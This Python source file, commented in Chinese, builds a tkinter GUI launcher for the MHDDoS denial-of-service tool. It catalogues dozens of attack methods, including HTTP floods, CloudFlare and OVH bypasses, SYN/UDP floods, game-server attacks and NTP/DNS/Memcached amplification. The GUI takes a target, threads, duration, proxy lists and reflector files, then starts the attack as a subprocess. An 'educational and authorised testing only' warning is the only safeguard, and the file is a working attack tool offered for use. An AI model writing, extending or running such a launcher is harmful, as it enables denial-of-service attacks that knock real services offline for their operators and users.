#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MHDDoS抽屉式攻击类型选择界面
提供分类的抽屉式下拉选项卡片
⚠️ 仅用于教育和授权的安全测试
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import subprocess
import threading
import time
import os
from pathlib import Path

class MHDDoS_Drawer_GUI:
    """MHDDoS抽屉式GUI界面"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("MHDDoS抽屉式攻击工具")
        self.root.geometry("1000x800")
        self.root.resizable(True, True)
        
        # 攻击状态
        self.is_attacking = False
        self.attack_process = None
        self.selected_method = "GET"
        
        # 攻击类型分类
        self.attack_categories = {
            "Layer7 HTTP攻击": {
                "GET": "HTTP GET请求洪水攻击",
                "POST": "HTTP POST请求洪水攻击", 
                "HEAD": "HTTP HEAD请求攻击",
                "NULL": "空请求攻击",
                "COOKIE": "Cookie洪水攻击",
                "SLOW": "慢速攻击",
                "DYN": "动态参数攻击"
            },
            "Layer7 绕过攻击": {
                "CFB": "CloudFlare绕过攻击",
                "BYPASS": "通用绕过攻击", 
                "OVH": "OVH防护绕过",
                "CFBUAM": "CloudFlare UAM绕过",
                "APACHE": "Apache服务器攻击",
                "XMLRPC": "XML-RPC攻击"
            },
            "Layer7 高级攻击": {
                "STRESS": "压力测试攻击",
                "PPS": "包每秒攻击",
                "EVEN": "均衡负载攻击",
                "GSB": "Google安全浏览绕过",
                "DGB": "深度防护绕过",
                "AVB": "反病毒绕过",
                "BOT": "机器人攻击",
                "BOMB": "炸弹攻击",
                "DOWNLOADER": "下载器攻击",
                "KILLER": "杀手攻击",
                "TOR": "Tor网络攻击",
                "RHEX": "随机十六进制攻击",
                "STOMP": "踩踏攻击"
            },
            "Layer4 基础攻击": {
                "TCP": "TCP连接洪水攻击",
                "UDP": "UDP数据包洪水攻击", 
                "SYN": "SYN洪水攻击",
                "ICMP": "ICMP洪水攻击",
                "CONNECTION": "连接洪水攻击",
                "CPS": "连接每秒攻击"
            },
            "Layer4 游戏攻击": {
                "MINECRAFT": "Minecraft服务器攻击",
                "MCBOT": "Minecraft机器人攻击",
                "FIVEM": "FiveM服务器攻击",
                "FIVEM-TOKEN": "FiveM令牌攻击", 
                "TS3": "TeamSpeak3攻击",
                "MCPE": "Minecraft PE攻击",
                "VSE": "VSE游戏服务器攻击"
            },
            "放大攻击": {
                "NTP": "NTP放大攻击",
                "DNS": "DNS放大攻击", 
                "MEM": "Memcached放大攻击",
                "CLDAP": "CLDAP放大攻击",
                "ARD": "Apple远程桌面放大攻击",
                "CHAR": "字符生成器放大攻击",
                "RDP": "RDP放大攻击"
            }
        }
        
        # 创建界面
        self.create_interface()
    
    def create_interface(self):
        """创建抽屉式界面"""
        # 主框架
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # 配置网格权重
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        
        # 标题
        title_label = ttk.Label(main_frame, text="MHDDoS抽屉式攻击工具", 
                               font=("Arial", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
        
        # 安全警告
        warning_label = ttk.Label(main_frame, 
                                 text="⚠️ 重要提醒: 此工具仅用于教育和授权的安全测试",
                                 foreground="red", font=("Arial", 10, "bold"))
        warning_label.grid(row=1, column=0, columnspan=3, pady=(0, 10))
        
        # 攻击类型选择区域
        self.create_attack_drawer(main_frame)
        
        # 攻击参数区域
        params_frame = ttk.LabelFrame(main_frame, text="攻击参数", padding="10")
        params_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 10))
        params_frame.columnconfigure(1, weight=1)
        
        # 当前选择的方法
        ttk.Label(params_frame, text="当前方法:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.current_method_var = tk.StringVar(value="GET - HTTP GET请求洪水攻击")
        current_method_label = ttk.Label(params_frame, textvariable=self.current_method_var,
                                        foreground="blue", font=("Arial", 10, "bold"))
        current_method_label.grid(row=0, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        # 目标地址
        ttk.Label(params_frame, text="目标地址:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.target_var = tk.StringVar(value="http://httpbin.org/get")
        self.target_entry = ttk.Entry(params_frame, textvariable=self.target_var, width=50)
        self.target_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        
        # 线程数和时长
        ttk.Label(params_frame, text="线程数:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.threads_var = tk.StringVar(value="100")
        self.threads_entry = ttk.Entry(params_frame, textvariable=self.threads_var, width=10)
        self.threads_entry.grid(row=2, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        ttk.Label(params_frame, text="攻击时长(秒):").grid(row=2, column=2, sticky=tk.W, pady=5, padx=(20, 0))
        self.duration_var = tk.StringVar(value="60")
        self.duration_entry = ttk.Entry(params_frame, textvariable=self.duration_var, width=10)
        self.duration_entry.grid(row=2, column=3, sticky=tk.W, pady=5, padx=(5, 0))
        
        # 代理设置
        ttk.Label(params_frame, text="代理类型:").grid(row=3, column=0, sticky=tk.W, pady=5)
        self.proxy_type_var = tk.StringVar(value="0")
        self.proxy_type_combo = ttk.Combobox(params_frame, textvariable=self.proxy_type_var, 
                                            values=["0 - 所有代理", "1 - HTTP", "4 - SOCKS4", "5 - SOCKS5", "6 - 随机"], width=15)
        self.proxy_type_combo.grid(row=3, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        ttk.Label(params_frame, text="代理文件:").grid(row=3, column=2, sticky=tk.W, pady=5, padx=(20, 0))
        self.proxy_file_var = tk.StringVar(value="http.txt")
        self.proxy_file_combo = ttk.Combobox(params_frame, textvariable=self.proxy_file_var,
                                            values=["http.txt", "socks4.txt", "socks5.txt"], width=15)
        self.proxy_file_combo.grid(row=3, column=3, sticky=tk.W, pady=5, padx=(5, 0))
        
        # RPC参数
        ttk.Label(params_frame, text="RPC:").grid(row=4, column=0, sticky=tk.W, pady=5)
        self.rpc_var = tk.StringVar(value="10")
        self.rpc_entry = ttk.Entry(params_frame, textvariable=self.rpc_var, width=10)
        self.rpc_entry.grid(row=4, column=1, sticky=tk.W, pady=5, padx=(5, 0))
        
        # 控制按钮区域
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.grid(row=4, column=0, columnspan=3, pady=10)
        
        self.start_button = ttk.Button(buttons_frame, text="开始攻击", 
                                      command=self.start_attack)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(buttons_frame, text="停止攻击", 
                                     command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        self.clear_button = ttk.Button(buttons_frame, text="清空输出", 
                                      command=self.clear_output)
        self.clear_button.pack(side=tk.LEFT, padx=5)
        
        # 输出区域
        output_frame = ttk.LabelFrame(main_frame, text="攻击输出", padding="10")
        output_frame.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(10, 0))
        output_frame.columnconfigure(0, weight=1)
        output_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(5, weight=1)
        
        self.output_text = scrolledtext.ScrolledText(output_frame, width=80, height=20)
        self.output_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # 状态栏
        self.status_var = tk.StringVar(value="就绪 - 请选择攻击方法")
        status_label = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN)
        status_label.grid(row=6, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 0))
    
    def create_attack_drawer(self, parent):
        """创建攻击类型抽屉"""
        # 攻击类型框架
        attack_frame = ttk.LabelFrame(parent, text="攻击类型选择", padding="10")
        attack_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        attack_frame.columnconfigure(0, weight=1)
        
        # 创建可折叠的分类框架
        self.category_frames = {}
        
        for i, (category_name, methods) in enumerate(self.attack_categories.items()):
            # 分类标题框架（可点击）
            category_header = ttk.Frame(attack_frame)
            category_header.grid(row=i, column=0, sticky=(tk.W, tk.E), pady=(5, 0))
            category_header.columnconfigure(1, weight=1)
            
            # 展开/折叠按钮
            toggle_btn = ttk.Button(category_header, text="+", width=3,
                                  command=lambda cat=category_name: self.toggle_category(cat))
            toggle_btn.grid(row=0, column=0, padx=(0, 5))
            
            # 分类标题
            category_label = ttk.Label(category_header, text=category_name, 
                                     font=("Arial", 11, "bold"))
            category_label.grid(row=0, column=1, sticky=tk.W)
            
            # 方法数量
            method_count = len(methods)
            count_label = ttk.Label(category_header, text=f"({method_count}种方法)",
                                   foreground="gray")
            count_label.grid(row=0, column=2, sticky=tk.W, padx=(5, 0))
            
            # 方法容器框架（初始隐藏）
            methods_frame = ttk.Frame(attack_frame)
            methods_frame.grid(row=i+1, column=0, sticky=(tk.W, tk.E), pady=(0, 5))
            methods_frame.grid_remove()  # 初始隐藏
            
            # 创建方法按钮网格
            methods_list = list(methods.items())
            for j, (method, description) in enumerate(methods_list):
                row = j // 3
                col = j % 3
                
                btn = ttk.Button(methods_frame, text=method, width=12,
                               command=lambda m=method, d=description: self.select_method(m, d))
                btn.grid(row=row, column=col, padx=5, pady=2, sticky=tk.W)
                
                # 添加工具提示
                self.create_tooltip(btn, description)
            
            # 存储分类状态
            self.category_frames[category_name] = {
                'header': category_header,
                'methods_frame': methods_frame,
                'toggle_btn': toggle_btn,
                'is_expanded': False
            }
    
    def create_tooltip(self, widget, text):
        """创建工具提示"""
        def on_enter(event):
            tooltip = tk.Toplevel()
            tooltip.wm_overrideredirect(True)
            tooltip.wm_geometry(f"+{event.x_root+10}+{event.y_root+10}")
            
            label = ttk.Label(tooltip, text=text, background="yellow", 
                            relief="solid", borderwidth=1)
            label.pack()
            widget.tooltip = tooltip
        
        def on_leave(event):
            if hasattr(widget, 'tooltip'):
                widget.tooltip.destroy()
        
        widget.bind("<Enter>", on_enter)
        widget.bind("<Leave>", on_leave)
    
    def toggle_category(self, category_name):
        """切换分类展开/折叠"""
        category = self.category_frames[category_name]
        
        if category['is_expanded']:
            # 折叠
            category['methods_frame'].grid_remove()
            category['toggle_btn'].config(text="+")
            category['is_expanded'] = False
        else:
            # 展开
            category['methods_frame'].grid()
            category['toggle_btn'].config(text="-")
            category['is_expanded'] = True
    
    def select_method(self, method, description):
        """选择攻击方法"""
        self.selected_method = method
        self.current_method_var.set(f"{method} - {description}")
        self.status_var.set(f"已选择: {method} - {description}")
        self.append_output(f"🎯 选择攻击方法: {method}\n")
        self.append_output(f"💡 方法说明: {description}\n\n")
    
    def append_output(self, text):
        """添加输出文本"""
        self.output_text.insert(tk.END, text)
        self.output_text.see(tk.END)
        self.root.update()
    
    def clear_output(self):
        """清空输出"""
        self.output_text.delete(1.0, tk.END)
    
    def validate_parameters(self):
        """验证参数"""
        try:
            if not self.selected_method:
                messagebox.showerror("错误", "请选择攻击方法")
                return False
            
            target = self.target_var.get().strip()
            if not target:
                messagebox.showerror("错误", "请输入目标地址")
                return False
            
            threads = int(self.threads_var.get())
            if threads <= 0 or threads > 10000:
                messagebox.showerror("错误", "线程数应在1-10000之间")
                return False
            
            duration = int(self.duration_var.get())
            if duration <= 0 or duration > 3600:
                messagebox.showerror("错误", "攻击时长应在1-3600秒之间")
                return False
            
            return True
            
        except ValueError:
            messagebox.showerror("错误", "参数格式错误，请检查输入")
            return False
    
    def build_command(self):
        """构建MHDDoS命令"""
        method = self.selected_method
        target = self.target_var.get().strip()
        threads = self.threads_var.get()
        duration = self.duration_var.get()
        proxy_type = self.proxy_type_var.get().split(" - ")[0]  # 提取数字
        proxy_file = self.proxy_file_var.get()
        rpc = self.rpc_var.get()
        
        # 基本命令
        cmd = ["python", "start.py", method, target]
        
        # Layer7方法参数
        layer7_methods = list(self.attack_categories["Layer7 HTTP攻击"].keys()) + \
                        list(self.attack_categories["Layer7 绕过攻击"].keys()) + \
                        list(self.attack_categories["Layer7 高级攻击"].keys())
        
        if method in layer7_methods:
            cmd.extend([proxy_type, threads, proxy_file, rpc, duration])
        else:
            # Layer4方法参数
            cmd.extend([threads, duration])
            
            # 放大攻击需要反射器文件
            amplification_methods = list(self.attack_categories["放大攻击"].keys())
            if method in amplification_methods:
                cmd.append("reflectors.txt")
        
        return cmd
    
    def start_attack(self):
        """开始攻击"""
        if not self.validate_parameters():
            return
        
        # 安全确认
        if not messagebox.askyesno("确认", "⚠️ 此工具仅用于教育和授权的安全测试\n\n确认开始攻击？"):
            return
        
        self.is_attacking = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_var.set("攻击进行中...")
        
        # 构建命令
        cmd = self.build_command()
        
        self.append_output("=" * 60 + "\n")
        self.append_output("🎯 开始MHDDoS攻击\n")
        self.append_output(f"命令: {' '.join(cmd)}\n")
        self.append_output("=" * 60 + "\n")
        
        # 在后台线程中运行攻击
        attack_thread = threading.Thread(target=self.run_attack, args=(cmd,))
        attack_thread.daemon = True
        attack_thread.start()
    
    def run_attack(self, cmd):
        """运行攻击"""
        try:
            self.append_output("[INFO] 启动攻击进程...\n")
            
            # 运行MHDDoS程序
            self.attack_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # 实时读取输出
            for line in iter(self.attack_process.stdout.readline, ''):
                if not self.is_attacking:
                    break
                self.append_output(line)
            
            # 等待进程结束
            self.attack_process.wait()
            
            if self.is_attacking:
                self.append_output("\n[INFO] 攻击完成\n")
                self.status_var.set("攻击完成")
            else:
                self.append_output("\n[INFO] 攻击已停止\n")
                self.status_var.set("攻击已停止")
                
        except Exception as e:
            self.append_output(f"\n[ERROR] 攻击错误: {e}\n")
            self.status_var.set("攻击错误")
        
        finally:
            self.is_attacking = False
            self.root.after(0, self.reset_ui)
    
    def stop_attack(self):
        """停止攻击"""
        self.is_attacking = False
        
        if self.attack_process:
            try:
                self.attack_process.terminate()
                self.attack_process.wait(timeout=5)
            except:
                try:
                    self.attack_process.kill()
                except:
                    pass
        
        self.append_output("\n[INFO] 正在停止攻击...\n")
        self.status_var.set("正在停止...")
    
    def reset_ui(self):
        """重置UI状态"""
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        if not self.is_attacking:
            self.status_var.set("就绪")

def main():
    """主函数"""
    root = tk.Tk()
    app = MHDDoS_Drawer_GUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()